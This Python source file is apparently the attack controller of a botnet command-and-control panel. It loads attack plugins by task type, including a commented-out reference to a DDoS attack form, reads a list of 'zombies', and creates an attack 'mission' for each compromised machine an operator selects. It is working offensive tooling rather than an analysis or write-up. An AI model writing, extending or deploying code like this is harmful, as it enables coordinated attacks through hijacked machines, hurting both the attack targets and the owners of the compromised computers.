#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

from app import logger

from app.modules import DataFilter

from app.models import *
from app.forms import *

from app.components.plugin_manager import PluginManager


class AttackController:
    def __init__(self, task_type):
        self.error = None
        self.created = []

        self.AttackModel = object
        for plugin in PluginManager.plugins:
            if task_type == plugin:
                self.AttackModel = PluginManager.plugins[plugin]
                break
        #self.form = CreateDDosAttackForm
        self.form = None

        # get zombies data
        self.zombies_data = {}
        zombies_filter = DataFilter('zombies')
        zombies_filter.run()
        if zombies_filter.data:
            self.zombies_data = zombies_filter.data

    def run(self, request):
        # create new attack
        #if (request.method == 'POST') and ('create_btn' in request.form):
        if self.form.validate_on_submit():
            task = self.AttackModel()
            mission = Mission()
            if task.create(request.form.to_dict()):
                mission.task_id = task.id
                logger.log('task created, trying to create mission for each zombie selected...', 'INFO')

                selected_zombies = request.form.getlist('zombies_checked')
                for zombie in selected_zombies:
                    mission.zombie_username = zombie
                    if mission.create():
                        self.created.append(zombie)
                        logger.log('mission for {} created'.format(zombie), 'SUCCESS')
